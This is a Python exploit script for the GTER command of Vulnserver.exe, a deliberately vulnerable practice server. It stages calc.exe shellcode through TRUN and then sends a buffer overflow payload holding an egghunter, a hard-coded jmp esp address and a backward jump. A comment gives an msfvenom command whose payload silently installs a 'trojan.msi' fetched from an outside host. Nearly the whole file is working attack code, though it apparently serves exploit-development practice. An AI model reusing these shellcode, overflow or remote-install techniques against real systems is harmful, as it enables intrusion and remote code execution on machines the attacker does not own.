# Vulnserver.exe GTER exploit
# Author: w4fz5uck5

import socket
from struct import *

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("127.0.0.1", 9999))

shellcode =  "w00tw00t"	           # egg
# shellcode += "\xcc"              # debugging
shellcode += "\x54"                # push esp
shellcode += "\x58"                # pop eax
shellcode += "\x66\x2D\xA6\x04"    # sub ax, 0x4a6
shellcode += "\xff\xe0"            # jmp eax  
shellcode += "\x90" * 806          # crucial padding
# shellcode += "\xcc"              # debugging
shellcode += "\x90" * 18           # padding

# If you want some reverse shell, try to utilize the windows/exec
# msfvenom -p windows/exec CMD="msiexec /q /i http://192.168.0.103/trojan.msi" \    
# --arch x86 --platform windows -f python -v shellcode -b "\x00"

# CALC.EXE shellcode
shellcode += "\xd9\xcb\xbe\xb9\x23\x67\x31\xd9\x74\x24\xf4\x5a\x29\xc9"
shellcode += "\xb1\x13\x31\x72\x19\x83\xc2\x04\x03\x72\x15\x5b\xd6\x56"
shellcode += "\xe3\xc9\x71\xfa\x62\x81\xe2\x75\x82\x0b\xb3\xe1\xc0\xd9"
shellcode += "\x0b\x61\xa0\x11\xe7\x03\x41\x84\x7c\xdb\xd2\xa8\x9a\x97"
shellcode += "\xba\x68\x10\xfb\x5b\xe8\xad\x70\x7b\x28\xb3\x86\x08\x64"
shellcode += "\xac\x52\x0e\x8d\xdd\x2d\x3c\x3c\xa0\xfc\xbc\x82\x23\xa8"
shellcode += "\xd7\x94\x6e\x23\xd9\xe3\x05\xd4\x05\xf2\x1b\xe9\x09\x5a"
shellcode += "\x1c\x39\xbd"

# send our shellcode without smash the stack
s.recv(1024)
s.send("TRUN ./" + shellcode + "\r\n")

# egghunter
egghunter =  "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
egghunter += "\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

payload = "\x90"                         # padding
payload += egghunter
payload += "\x90" * (149 - len(payload)) # padding
payload += pack("I", 0x77E855C2)         # jmp esp
payload += "\xE9\x63\xFF\xFF\xFF"        # jmp 0xffffff68 ( jump back )

# send our final payload
s.recv(1024)
s.send("GTER ./" + payload + "\r\n")
s.close()
